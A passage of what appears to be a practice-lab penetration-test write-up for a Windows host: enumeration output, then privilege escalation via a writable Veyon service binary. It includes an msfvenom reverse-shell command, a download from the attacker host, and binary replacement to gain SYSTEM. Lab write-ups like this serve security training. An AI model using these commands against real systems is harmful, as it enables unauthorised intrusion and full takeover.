Task: \Microsoft\Windows\Management\Provisioning\Logon
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\ProvTool.exe /turn 5 /source LogonIdleTask
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Management\Provisioning\Retry
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\ProvTool.exe /turn 5 /source ProvRetryTask
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Management\Provisioning\RunOnReboot
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\ProvTool.exe /turn 5 /source ContinueSessionTask
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Maps\MapsToastTask
Why: Hidden task
Action:

[+] Scheduled task action paths with weak ACL (privesc candidates)
No scheduled task action paths with weak ACL patterns found.


```

  10.  Network

```
================================================================================
9) Network
================================================================================

[+] Network identity + routing (summary)
InterfaceAlias IPv4Address       IPv4DefaultGateway                                                DNSServer
-------------- -----------       ------------------                                                ---------
Ethernet0      {192.168.148.140} {MSFT_NetRoute (InstanceID = ":8:8:8:9:55?55;C?8;@B8;?B8???55;")} {MSFT_DNSClientServerAddress (Name = "2", CreationClassName = "", SystemCreationClassName = "", SystemName = "23"), MSFT_DNSClientServerAddress (Name = "2", CreationClassName = "", SystemCreationClassName = "", SystemName = "2")}

[+] Listening TCP ports (first 80)
LocalAddress    LocalPort OwningProcess
------------    --------- -------------
0.0.0.0                25           268
0.0.0.0                79           268
0.0.0.0               105           268
0.0.0.0               106           268
0.0.0.0               110           268
::                    135           864
0.0.0.0               135           864
192.168.148.140       139             4
0.0.0.0               143           268
::                    443           744
0.0.0.0               443           744
::                    445             4
0.0.0.0              2224           268
0.0.0.0              5040          4624
::                   7680          8228
0.0.0.0              8000           744
::                   8000           744
::                  11100          4524
127.0.0.1           11200          4524
127.0.0.1           11300          4524
127.0.0.1           14147          3520
::1                 14147          3520
::                  20001          3520
0.0.0.0             20001          3520
::                  33006          3276
::                  49664           644
0.0.0.0             49664           644
0.0.0.0             49665           496
::                  49665           496
::                  49666           512
0.0.0.0             49666           512
0.0.0.0             49667          1316
::                  49667          1316
0.0.0.0             49668           628
::                  49668           628
::                  49669          2436
0.0.0.0             49669          2436

[+] Firewall profiles and status
Name    Enabled DefaultInboundAction DefaultOutboundAction
----    ------- -------------------- ---------------------
Domain    False                Block                 Block
Private   False                Block                 Block
Public    False                Block                 Block


```

  11. Software

```

================================================================================
10) Software
================================================================================

[+] Installed non-Microsoft software (triage, first 80)
DisplayName     : Java 8 Update 271
DisplayVersion  : 8.0.2710.9
Publisher       : Oracle Corporation
InstallDate     : 20201020
InstallLocation : C:\Program Files (x86)\Java\jre1.8.0_271\
DisplayName     : Java Auto Updater
DisplayVersion  : 2.8.271.9
Publisher       : Oracle Corporation
InstallDate     : 20201020
InstallLocation :
DisplayName     : Mozilla Thunderbird 78.3.2 (x86 en-US)
DisplayVersion  : 78.3.2
Publisher       : Mozilla
InstallDate     :
InstallLocation : C:\Program Files (x86)\Mozilla Thunderbird
DisplayName     : Veyon
DisplayVersion  : 4.3.4.0
Publisher       : Veyon Solutions
InstallDate     :
InstallLocation :

[+] Interesting software keywords (quick hits)
DisplayName       DisplayVersion Publisher
-----------       -------------- ---------
Java 8 Update 271 8.0.2710.9     Oracle Corporation
Java Auto Updater 2.8.271.9      Oracle Corporation


```

  12. Shares & Drivers

```
11) Shares & Drivers
================================================================================

[+] SMB shares (non-default)
Name   Path       Description
----   ----       -----------
ADMIN$ C:\WINDOWS Remote Admin
IPC$              Remote IPC

[+] Third-party drivers (non-Microsoft, running)
Name        : BasicDisplay
DisplayName : BasicDisplay
StartMode   : System
State       : Running
PathName    : C:\WINDOWS\system32\DriverStore\FileRepository\basicdisplay.inf_amd64_65ab9a260dbf7467\BasicDisplay.sys
Name        : BasicRender
DisplayName : BasicRender
StartMode   : System
State       : Running
PathName    : C:\WINDOWS\system32\DriverStore\FileRepository\basicrender.inf_amd64_df49c4daa6251397\BasicRender.sys
Name        : CompositeBus
DisplayName : Composite Bus Enumerator Driver
StartMode   : Manual
State       : Running
PathName    : C:\WINDOWS\system32\DriverStore\FileRepository\compositebus.inf_amd64_7500cffa210c6946\CompositeBus.sys
Name        : swenum
DisplayName : Software Bus Driver
StartMode   : Manual
State       : Running
PathName    : C:\WINDOWS\system32\DriverStore\FileRepository\swenum.inf_amd64_16a14542b63c02af\swenum.sys
Name        : umbus
DisplayName : UMBus Enumerator Driver
StartMode   : Manual
State       : Running
PathName    : C:\WINDOWS\system32\DriverStore\FileRepository\umbus.inf_amd64_b78a9c5b6fd62c27\umbus.sys


```

  13. Loot Files & Credentials

```
12) Loot Files & Credentials
================================================================================

[+] cmdkey /list
$ cmdkey /list
Currently stored credentials:
    Target: MicrosoftAccount:target=SSO_POP_Device
    Type: Generic
    User: 02huqytolgabhyag
    Saved for this logon only
    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02huqytolgabhyag
    Local machine persistence

[+] Directory listing: C:\\ (top level)
Mode   LastWriteTime         Length    Name
----   -------------         ------    ----
d--hs- 3/4/2025 6:35:45 AM             $Recycle.Bin
d--h-- 12/1/2021 1:44:03 PM            $WinREAgent
d--hsl 10/16/2020 3:00:34 PM           Documents and Settings
d----- 10/20/2020 1:05:33 PM           FTP
d----- 12/7/2019 4:14:52 AM            PerfLogs
d-r--- 2/26/2026 8:31:33 PM            Program Files
d-r--- 12/1/2021 5:58:59 PM            Program Files (x86)
d--h-- 12/6/2021 7:49:56 AM            ProgramData
d--hs- 12/1/2021 3:00:10 PM            Recovery
d--hs- 10/16/2020 3:03:00 PM           System Volume Information
d-r--- 12/1/2021 3:01:15 PM            Users
d----- 4/13/2022 3:38:25 AM            Windows
d----- 10/16/2020 8:19:33 PM           xampp
-a-hs- 3/4/2025 6:35:26 AM   8192      DumpStack.log.tmp
-a---- 10/16/2020 9:00:35 PM 114176    ImapX.dll
-a---- 2/26/2026 8:30:41 PM  2659      output.txt
-a-hs- 3/4/2025 6:35:26 AM   738197504 pagefile.sys
-a-hs- 3/4/2025 6:35:26 AM   268435456 swapfile.sys

[+] Directory listing: C:\\Users (top level)
Mode   LastWriteTime        Length Name
----   -------------        ------ ----
d----- 12/2/2021 8:39:57 AM        Administrator
d--hsl 12/7/2019 4:30:39 AM        All Users
d-rh-- 12/1/2021 3:06:47 PM        Default
d--hsl 12/7/2019 4:30:39 AM        Default User
d----- 2/28/2025 3:43:41 AM        Ela Arwel
d-r--- 12/1/2021 5:56:39 PM        Public
-a-hs- 12/7/2019 4:12:42 AM 174    desktop.ini

[+] Directory listing: current user profile (top level)
Mode   LastWriteTime          Length  Name
----   -------------          ------  ----
d-r--- 12/1/2021 3:07:20 PM           3D Objects
d--h-- 12/1/2021 3:01:53 PM           AppData
d--hsl 12/1/2021 3:01:16 PM           Application Data
d-r--- 12/1/2021 3:07:20 PM           Contacts
d--hsl 12/1/2021 3:01:16 PM           Cookies
d-r--- 2/26/2026 8:55:31 PM           Desktop
d-r--- 4/13/2022 3:31:56 AM           Documents
d-r--- 4/13/2022 2:48:57 AM           Downloads
d-r--- 12/1/2021 3:07:20 PM           Favorites
d-r--- 12/1/2021 3:07:20 PM           Links
d--hsl 12/1/2021 3:01:16 PM           Local Settings
d--h-- 10/16/2020 8:14:52 PM          MicrosoftEdgeBackups
d-r--- 12/1/2021 3:07:20 PM           Music
d--hsl 12/1/2021 3:01:16 PM           My Documents
d--hsl 12/1/2021 3:01:16 PM           NetHood
d-r--- 10/16/2020 3:25:31 PM          OneDrive
d-r--- 12/1/2021 3:07:20 PM           Pictures
d--hsl 12/1/2021 3:01:16 PM           PrintHood
d--hsl 12/1/2021 3:01:16 PM           Recent
d-r--- 12/1/2021 3:07:20 PM           Saved Games
d-r--- 12/1/2021 3:07:20 PM           Searches
d--hsl 12/1/2021 3:01:16 PM           SendTo
d--hsl 12/1/2021 3:01:16 PM           Start Menu
d--hsl 12/1/2021 3:01:16 PM           Templates
d----- 10/20/2020 10:38:16 AM         Veyon
d-r--- 12/1/2021 3:07:20 PM           Videos
-a---- 5/17/2021 1:53:17 PM   1113    check_email.ps1
-a-h-- 4/20/2022 2:23:09 AM   1310720 NTUSER.DAT
-a-hs- 12/1/2021 3:01:16 PM   340992  ntuser.dat.LOG1
-a-hs- 12/1/2021 3:01:16 PM   364544  ntuser.dat.LOG2
-a-hs- 3/4/2025 6:36:43 AM    1048576 NTUSER.DAT{2ba511bc-52e1-11ec-a00d-0050568a90dd}.TxR.0.regtrans-ms
-a-hs- 2/28/2025 3:43:41 AM   1048576 NTUSER.DAT{2ba511bc-52e1-11ec-a00d-0050568a90dd}.TxR.1.regtrans-ms
-a-hs- 2/28/2025 3:43:41 AM   1048576 NTUSER.DAT{2ba511bc-52e1-11ec-a00d-0050568a90dd}.TxR.2.regtrans-ms
-a-hs- 3/4/2025 6:36:43 AM    65536   NTUSER.DAT{2ba511bc-52e1-11ec-a00d-0050568a90dd}.TxR.blf
-a-hs- 12/1/2021 3:01:16 PM   65536   NTUSER.DAT{2ba511bd-52e1-11ec-a00d-0050568a90dd}.TM.blf
-a-hs- 12/1/2021 3:01:16 PM   524288  NTUSER.DAT{2ba511bd-52e1-11ec-a00d-0050568a90dd}.TMContainer00000000000000000001.regtrans-ms
-a-hs- 12/1/2021 3:01:16 PM   524288  NTUSER.DAT{2ba511bd-52e1-11ec-a00d-0050568a90dd}.TMContainer00000000000000000002.regtrans-ms
---hs- 12/1/2021 3:07:07 PM   20      ntuser.ini

[+] Unattended install / sysprep credential files
(no output)

[+] Sensitive file name hits in common user paths
(no output)

[+] PowerShell history (all users, full content)
--------------------------------------------------------------------------------
History File: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
LastWrite: 04/13/2022 03:52:27 | Size: 18
--------------------------------------------------------------------------------
Restart-Computer

[+] User directory interesting files (*.txt, *.ps1, *.ini, *.xml, *.config, *.kdbx, *.rdp)
FullName                                                 LastWriteTime         Length
--------                                                 -------------         ------
C:\Users\Administrator\Desktop\proof.txt                 2/26/2026 8:30:43 PM      34
C:\Users\Ela Arwel\check_email.ps1                       5/17/2021 1:53:17 PM    1113
C:\Users\Ela Arwel\Desktop\local.txt                     2/26/2026 8:30:38 PM      34
C:\Users\Ela Arwel\Desktop\pg_privesc.ps1                2/26/2026 8:52:31 PM   25174
C:\Users\Ela Arwel\Desktop\privesc_2026-02-26_205531.txt 2/26/2026 8:55:41 PM   90186
C:\Users\Ela Arwel\Veyon\LICENSE.TXT                     3/13/2020 10:24:28 AM  19164
C:\Users\Ela Arwel\Veyon\README.TXT                      3/13/2020 10:24:28 AM   6099

[+] Unusual writable paths (potential current-user write access)
Path                   Reason
----                   ------
C:\FTP                 Non-standard path
C:\ProgramData\Mozilla ProgramData subdir
C:\ProgramData\Qbik    ProgramData subdir
C:\xampp               Non-standard path
PS C:\Users\Ela Arwel\Desktop> ^C


```

5. Automated Enumeration

```

Home folders found
    C:\Users\Administrator : Ela Arwel [Allow: AllAccess]
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\Ela Arwel : Ela Arwel [Allow: AllAccess]
    C:\Users\Public : Interactive [Allow: WriteData/CreateFiles]

 VeyonService(Veyon Solutions - Veyon Service)[C:\Users\Ela Arwel\Veyon\veyon-service.exe] - Auto - Running - No quotes and Space detected                                                                                           
    File Permissions: Ela Arwel [Allow: AllAccess]
    Possible DLL Hijacking in binary folder: C:\Users\Ela Arwel\Veyon (Ela Arwel [Allow: AllAccess])



```

5. Possible PE Paths

```
[+] Unquoted service path candidates (privesc)
Name      : VeyonService
StartName : LocalSystem
StartMode : Auto
State     : Running
PathName  : C:\Users\Ela Arwel\Veyon\veyon-service.exe

Task: \Check Email
RunAs: Ela Arwel
Why: Non-Microsoft task path; Runs as user/service account: Ela Arwel; LOLBIN launcher in action
Action: powershell.exe .\check_email.ps1

 C:\Users\Administrator : Ela Arwel [Allow: AllAccess]

```

**Privilege Escalation**

1. PE Steps

- Confirmed that it's possible to edit the veyon-service.exe file. Also, confirmed that the user while not able to restart the service, could restart the entire system.

- Created malicous exe use MSFVenom. 

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=4444 -f exe -o shell.exe
```

- Copied malicious exe onto victim system, then replaced veyon-service.exe with the malicious file. 

```
iwr -uri http://192.168.45.215/shell.exe -Outfile shell.exe

mv shell.exe veyon-service.exe
```

- Restarted system.

```
shutdown -r -t 1
```

- Received shell as system.

![[Pasted image 20260227140153.png]]
```

```

2. Notes

```

```

